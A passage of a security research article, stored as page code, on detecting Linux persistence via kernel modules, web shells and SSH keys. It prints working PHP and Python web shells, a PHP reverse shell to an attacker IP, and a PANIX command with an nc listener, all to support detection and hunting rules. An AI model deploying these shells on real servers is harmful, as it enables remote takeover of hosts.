these:\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Category\"}),(0,n.jsx)(e.th,{children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Driver\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load.toml\",rel:\"nofollow\",children:\"Kernel Driver Load\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load_by_non_root.toml\",rel:\"nofollow\",children:\"Kernel Driver Load by non-root User\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"File\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_lkm_configuration_file_creation.toml\",rel:\"nofollow\",children:\"Loadable Kernel Module Configuration File Creation\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_kernel_object_file_creation.toml\",rel:\"nofollow\",children:\"Kernel Object File Creation\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Process\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_insmod_kernel_module_load.toml\",rel:\"nofollow\",children:\"Kernel Module Load via insmod\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_kernel_module_removal.toml\",rel:\"nofollow\",children:\"Kernel Module Removal\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/discovery_kernel_module_enumeration.toml\",rel:\"nofollow\",children:\"Enumeration of Kernel Modules\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_clear_kernel_ring_buffer.toml\",rel:\"nofollow\",children:\"Attempt to Clear Kernel Ring Buffer\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_load_and_unload_of_kernel_via_kexec.toml\",rel:\"nofollow\",children:\"Kernel Load or Unload via Kexec Detected\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Syslog\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_load.toml\",rel:\"nofollow\",children:\"Tainted Kernel Module Load\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_out_of_tree_load.toml\",rel:\"nofollow\",children:\"Tainted Out-Of-Tree Kernel Module Load\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover loadable kernel module persistence\"})}),(0,n.jsx)(e.td,{})]})]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For more information on how to set up the Auditd Manager integration to capture driver events and much more, check out the \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd\",rel:\"nofollow\",children:\"Linux Detection Engineering with Auditd\"}),\" publication.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"We can revert this module by executing the following command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e sudo ./panix.sh --revert lkm\n\n###### [+] Reverting lkm module... #####\n\n[+] Unloading kernel module 'panix'...\n[+] Kernel module 'panix' unloaded successfully.\n[+] Removing kernel module file '/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko'...\n[+] Kernel module file '/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko' removed successfully.\n[+] Removing temporary directory '/tmp/lkm'...\n[+] Temporary directory '/tmp/lkm' removed successfully.\n[+] Removing panix from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...\n[+] Updating module dependencies...\n[+] Module dependencies updated.\n`})}),`\n`,(0,n.jsx)(e.h4,{id:\"hunting-for-t1547006---kernel-modules-and-extensions\",children:\"Hunting for T1547.006 - Kernel Modules and Extensions\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can hunt for this technique using ES|QL and OSQuery, focusing on suspicious kernel module activity, including the creation of \",(0,n.jsx)(e.code,{children:\".ko\"}),\" files, execution of kernel module management tools, and modifications to kernel module configuration files. The hunting approach includes:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Monitoring kernel module file creation:\"}),\" Tracks \",(0,n.jsx)(e.code,{children:\".ko\"}),\" file creations in non-standard directories to detect potentially malicious modules.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Identifying unusual module management executions:\"}),\" Monitors processes such as \",(0,n.jsx)(e.code,{children:\"kmod\"}),\", \",(0,n.jsx)(e.code,{children:\"modprobe\"}),\", \",(0,n.jsx)(e.code,{children:\"insmod\"}),\", and \",(0,n.jsx)(e.code,{children:\"rmmod\"}),\" for suspicious or uncommon arguments.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Detecting changes to configuration files:\"}),\" Observes files like \",(0,n.jsx)(e.code,{children:\"/etc/modprobe.d/\"}),\", \",(0,n.jsx)(e.code,{children:\"/etc/modules\"}),\", and related directories for modifications that might enable persistence.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Focus on rare drivers:\"}),\" Use queries that identify kernel modules loaded via \",(0,n.jsx)(e.code,{children:\"init_module\"}),\" or \",(0,n.jsx)(e.code,{children:\"finit_module\"}),\" syscalls that occur infrequently.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_loadable_kernel_modules.md\",rel:\"nofollow\",children:\"Persistence via Loadable Kernel Modules\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_driver_load_with_low_occurrence_frequency.md\",rel:\"nofollow\",children:\"Drivers Load with Low Occurrence Frequency\"}),\" hunting rules, along with tailored detection queries, analysts can effectively identify \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1547/006/\",rel:\"nofollow\",children:\"T1547.006\"}),\"-related activity.\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1505003---server-software-component-web-shell\",children:\"T1505.003 - Server Software Component: Web Shell\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"A web shell is a malicious script uploaded to a web server, enabling attackers to execute arbitrary commands on the host. They are commonly deployed after exploiting vulnerabilities in server software, weak file upload restrictions, or misconfigurations. Web shells are typically small scripts written in commonly supported languages such as PHP, Python, or Perl. This activity is tracked by MITRE under \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1505/003/\",rel:\"nofollow\",children:\"T1505.003\"}),\".\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"t1505003---web-shell---php--python\",children:\"T1505.003 - Web Shell - PHP \u0026 Python\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Web shells often integrate seamlessly with web server configurations like \",(0,n.jsx)(e.code,{children:\"Apache\"}),\", \",(0,n.jsx)(e.code,{children:\"Nginx\"}),\", or \",(0,n.jsx)(e.code,{children:\"Lighttpd\"}),\". These scripts can be categorized into two primary types: command execution (CMD) and reverse shell web shells.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"1. Command shells\"})}),`\n`,(0,n.jsx)(e.p,{children:\"CMD web shells provide a simple interface to execute system commands through a browser or remote tool. A typical PHP CMD web shell might look like this:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-php\",children:`\u003c?php\nif (isset($_GET['cmd'])) {\n    echo shell_exec($_GET['cmd']);\n}\n?\u003e\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"2. Reverse shells\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Reverse shell web shells establish an outbound connection from the compromised server to the attacker\\u2019s machine. An example PHP reverse shell:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-php\",children:`\u003c?php\n$ip = '192.168.1.100'; // Attacker IP\n$port = 4444;          // Attacker Port\n$socket = fsockopen($ip, $port);\nexec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");\n?\u003e\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The attacker runs a listener on their machine using \",(0,n.jsx)(e.code,{children:\"Netcat\"}),\" or any other listener. When the shell script is accessed, it connects to the attacker, providing an interactive session.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Leveraging the Common Gateway Interface (CGI) for web shells\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.a,{href:\"https://www.ibm.com/docs/en/i/7.4?topic=functionality-cgi\",rel:\"nofollow\",children:\"Common Gateway Interface (CGI)\"}),\" allows web servers to execute external scripts and return their output to clients. Attackers can use CGI scripts to execute commands in various languages, including Python, Bash, and Perl. A Python CGI web shell example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`#!/usr/bin/env python3\nimport cgi\nimport os\n\nprint(\"Content-type: text/html\\\\n\\\\n\")\nform = cgi.FieldStorage()\ncommand = form.getvalue(\"cmd\")\nif command:\n    output = os.popen(command).read()\n    print(output)\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"CGI scripts offer versatility and can be used in environments where PHP or other web shells might be restricted.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Attackers often target web root directories like \",(0,n.jsx)(e.code,{children:\"/var/www/html/\"}),\" to upload their web shells. Weak file upload restrictions or misconfigured permissions allow them to place malicious scripts. To enhance persistence, attackers may:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Embed Web Shells in Existing Files\"}),\": Modify legitimate files to include web shell code, making detection more challenging.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Use Built-in Web Servers\"}),\": Attackers can start a web server in a specific directory to bypass restrictions\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Leverage Hidden Directories\"}),\": To avoid detection, locate web shells in obscure or hidden directories.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"Although this type of implementation is also possible for languages other than PHP and Python, they commonly require modules/plugins to be installed, making them a less viable option. The following section will explore detailed examples of these methods and their corresponding detection strategies.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"persistence-through-t1505003---web-shell-php--python\",children:\"Persistence through T1505.003 - Web Shell: PHP \u0026 Python\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Let\\u2019s examine how PANIX leverages PHP, Python, and CGI to establish web shell backdoors within the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_web_shell.sh\",rel:\"nofollow\",children:\"setup_web_shell.sh\"}),\" module. Refer to the module to inspect the full payloads.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Depending on permissions, PANIX creates a web server in \",(0,n.jsx)(e.code,{children:\"/var/www/html/\"}),\" (root) or \",(0,n.jsx)(e.code,{children:\"$HOME/\"}),\" (non-root). PHP uses the \",(0,n.jsx)(e.code,{children:\"-S\"}),\" flag to start a lightweight server, with \",(0,n.jsx)(e.code,{children:\"-t\"}),\" specifying the root directory to serve the web shells. For Python, the \",(0,n.jsx)(e.code,{children:\"-m http.server\"}),\" module is combined with \",(0,n.jsx)(e.code,{children:\"--cgi\"}),\" to enable dynamic execution of CGI scripts. If only Python 2 is available, PANIX falls back to \",(0,n.jsx)(e.code,{children:\"-m CGIHTTPServer\"}),\" for compatibility.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Servers are launched in the background using \",(0,n.jsx)(e.code,{children:\"nohup\"}),\" to ensure persistence, remaining active even after the user logs out.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s look at what traces we can detect within these chains, starting with a PHP CMD shell. To simulate this activity, we can use the following PANIX command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e ./panix.sh --web-shell --language php --mechanism cmd --port 8080\n\n[+] Web server directory created at /home/ruben/panix/\n[+] cmd.php file created in /home/ruben/panix/\n[+] Interact via: curl http://\u003cip\u003e:8080/cmd.php?cmd=whoami\n[!] Starting PHP server on port 8080...\n[+] PHP server running in the background at port 8080.\n[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.\n\nRun the following commands in case of issues on RHEL/CentOS systems:\n\nsudo firewall-cmd --add-port=8080/tcp --permanent\nsudo firewall-cmd --reload\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After execution, we can call the \",(0,n.jsx)(e.code,{children:\"cmd.php\"}),\" through the following \",(0,n.jsx)(e.code,{children:\"curl\"}),\" command:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e curl http://192.168.1.100:8080/cmd.php?cmd=whoami\nruben\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Executing the payload generates the following documents in Kibana:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/continuation-on-persistence-mechanisms/image3.png\",alt:\"PANIX web-shell module execution visualized in Kibana (command shell payload)\",title:\"PANIX web-shell module execution visualized in Kibana (command shell payload)\",width:\"1364\",height:\"818\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The figure above shows PANIX being executed and the \",(0,n.jsx)(e.code,{children:\"/home/ruben/panix/\"}),\" directory being created (as PANIX is executed with user privileges). The \",(0,n.jsx)(e.code,{children:\"cmd.php\"}),\" file is created, and the PHP web shell is spawned with the \",(0,n.jsx)(e.code,{children:\"-S\"}),\" flag and listens on all interfaces (\",(0,n.jsx)(e.code,{children:\"0.0.0.0\"}),\") on port 8080. Upon execution of the \",(0,n.jsx)(e.code,{children:\"curl\"}),\" command from the attack host, we can see a \",(0,n.jsx)(e.code,{children:\"connection_accepted\"}),\", followed by the execution of the \",(0,n.jsx)(e.code,{children:\"whoami\"}),\" command, followed by a \",(0,n.jsx)(e.code,{children:\"disconnect_received\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"To simulate reverse shell behavior, we can simulate a Python reverse shell through the following PANIX command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`./panix.sh --web-shell --language python --mechanism reverse --port 8080 --rev-port 2018 --ip 192.168.1.100\n\n[+] Web server directory created at /home/ruben/panix/\n[+] reverse.py file created in /home/ruben/panix/cgi-bin/\n[+] Interact via: curl http://\u003cip\u003e:8080/cgi-bin/reverse.py\n[!] Starting Python3 server on port 8080 with CGI enabled...\n[+] Python3 server running in the background at port 8080.\n[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.\n\nRun the following commands in case of issues on RHEL/CentOS systems:\n\nsudo firewall-cmd --add-port=8080/tcp --permanent\nsudo firewall-cmd --reload\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After which, we can communicate with the reverse shell from the attacker machine through the following commands:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`// Terminal 1\n\u003e curl http://192.168.1.100:8080/cgi-bin/reverse.py\n\n// Terminal 2\n\u003e nc -nvlp 2018\nlistening on [any] 2018 ...\nconnect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 47250\n\u003e whoami\nruben\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"This module generates the following documents:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/continuation-on-persistence-mechanisms/image4.png\",alt:\"PANIX web-shell module execution visualized in Kibana (reverse shell payload)\",title:\"PANIX web-shell module execution visualized in Kibana (reverse shell payload)\",width:\"1655\",height:\"1349\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After PANIX executes, we can see \",(0,n.jsx)(e.code,{children:\"/home/ruben/panix/cgi-bin/reverse.py\"}),\" being created and execution permissions being granted. A \",(0,n.jsx)(e.code,{children:\"python3\"}),\" web server with CGI support is spawned. After executing the \",(0,n.jsx)(e.code,{children:\"curl\"}),\" command from the attacker machine, we can see an incoming connection through the \",(0,n.jsx)(e.code,{children:\"connection_accepted\"}),\" event, followed by the execution of the reverse shell command, leading to the call back to the attacker machine through the \",(0,n.jsx)(e.code,{children:\"connection_attempted\"}),\" event. A fully interactive shell is obtained once the attacker catches the reverse connection.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e ./panix.sh --revert web-shell\n\n###### [+] Reverting web-shell module... #####\n\n[+] Running as non-root. Reverting web shell for user 'ruben'.\n[+] Reverting web shell for user 'ruben' at: /home/ruben/panix/\n[+] Identifying web server processes serving /home/ruben/panix/...\n[+] Killed process 11592 serving /home/ruben/panix/.\n[+] Removed web server directory: /home/ruben/panix/\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After which, all artifacts should be cleaned.\"}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s take a look at the coverage:\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Category\"}),(0,n.jsx)(e.th,{children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"File\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_suspicious_file_creation_via_web_server.toml\",rel:\"nofollow\",children:\"Suspicious File Creation via Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Process\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_from_suspicious_source_by_web_server.toml\",rel:\"nofollow\",children:\"File Downloaded from Suspicious Source by Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_and_piped_to_interpreter_by_web_server.toml\",rel:\"nofollow\",children:\"File Downloaded and Piped to Interpreter by Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_suspicious_download_and_redirect_by_web_server.toml\",rel:\"nofollow\",children:\"Suspicious Download and Redirect by Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_python_webserver_spawned.toml\",rel:\"nofollow\",children:\"Web Server Spawned via Python\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_creation.toml\",rel:\"nofollow\",children:\"Simple HTTP Web Server Creation\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_linux_shell_activity_via_web_server.toml\",rel:\"nofollow\",children:\"Potential Remote Code Execution via Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_file_downloaded_to_suspicious_location_by_web_server.toml\",rel:\"nofollow\",children:\"File Downloaded to Suspicious Location by Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_decode_activity_via_web_server.toml\",rel:\"nofollow\",children:\"Decode Activity via Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_unusual_command_executed_by_web_server.toml\",rel:\"nofollow\",children:\"Unusual Command Executed by Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Network\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_reverse_shell_executed_via_web_server.toml\",rel:\"nofollow\",children:\"Reverse Shell Executed via Web Server\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_connection_accepted.toml\",rel:\"nofollow\",children:\"Simple HTTP Web Server Connection\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover web shell persistence\"})}),(0,n.jsx)(e.td,{})]})]})]})}),`\n`,(0,n.jsx)(e.h4,{id:\"hunting-for-t1505003---web-shell\",children:\"Hunting for T1505.003 - Web Shell\"}),`\n`,(0,n.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious file creation events and anomalous network activity commonly associated with web shells. The approach includes monitoring for the following:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Creation or renaming of web shell files:\"}),\" Tracks files with extensions such as \",(0,n.jsx)(e.code,{children:\".php\"}),\", \",(0,n.jsx)(e.code,{children:\".py\"}),\", \",(0,n.jsx)(e.code,{children:\".pl\"}),\", \",(0,n.jsx)(e.code,{children:\".rb\"}),\", \",(0,n.jsx)(e.code,{children:\".lua\"}),\", and \",(0,n.jsx)(e.code,{children:\".jsp\"}),\" in unexpected or uncommon locations, which may indicate the deployment of a web shell.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Anomalous network activity by scripting engines:\"}),\" Observes disconnect events and unusual connections initiated by processes like \",(0,n.jsx)(e.code,{children:\"python\"}),\", \",(0,n.jsx)(e.code,{children:\"php\"}),\", or \",(0,n.jsx)(e.code,{children:\"perl\"}),\", particularly connections to external IP addresses.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Low-frequency external connections:\"}),\" Detects rare or low-volume network connections from processes, especially those initiated by root or unique agents, which can indicate malicious web shell activity.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_web_shell.md\",rel:\"nofollow\",children:\"Persistence via Web Shell\"}),\", \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_reverse_bind_shells.md\",rel:\"nofollow\",children:\"Persistence Through Reverse/Bind Shells\"}),\", and \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/low_volume_external_network_connections_from_process.md\",rel:\"nofollow\",children:\"Low Volume External Network Connections from Process by Unique Agent\"}),\" hunting rules with the tailored detection queries listed above, analysts can effectively detect and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1505/003/\",rel:\"nofollow\",children:\"T1505.003\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1098004---account-manipulation-ssh-authorized-keys\",children:\"T1098.004 - Account Manipulation: SSH Authorized Keys\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"SSH's \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" feature is a common target for attackers aiming to establish persistent access to compromised Linux systems. By placing their public keys in the \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" file, attackers can gain access without requiring further authentication if the private key is in their possession. This mechanism is controlled by files like \",(0,n.jsx)(e.code,{children:\".ssh/authorized_keys\"}),\" or \",(0,n.jsx)(e.code,{children:\".ssh/authorized_keys2\"}),\", typically in the user\\u2019s home directory. While this persistence method is well-documented, we explored its nuances in detail in \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1098004---account-manipulation-ssh\",rel:\"nofollow\",children:\"a previous article\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"In this section, we will focus on a less conventional but intriguing variation of this technique: abusing system accounts that by default are rarely used and have default configurations. This approach leverages the default home directories of these users to create \",(0,n.jsx)(e.code,{children:\".ssh\"}),\" directories and insert \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" files, enabling SSH-based persistence under these accounts. \",(0,n.jsx)(e.a,{href:\"https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/\",rel:\"nofollow\",children:\"Exatrack\\u2019s research\"}),\" on a new variant of the \",(0,n.jsx)(e.code,{children:\"perfctl\"}),\" malware recently explored this technique. Although this specific variation of the authorized keys persistence technique is not tracked by MITRE, the overall persistence technique is tracked under \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1098/004/\",rel:\"nofollow\",children:\"T1098.004\"}),\".\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"t1098004---ssh-authorized-keys-system-user-backdoors\",children:\"T1098.004 - SSH Authorized Keys: System User Backdoors\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"System accounts like \",(0,n.jsx)(e.code,{children:\"news\"}),\" or \",(0,n.jsx)(e.code,{children:\"nobody\"}),\" often exist on default Linux installations with non-interactive shells (e.g., \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\") and predefined home directories. These accounts, typically overlooked and not intended for direct login, can become attractive targets for attackers. We can observe their configurations in the \",(0,n.jsx)(e.code,{children:\"/etc/passwd\"}),\" 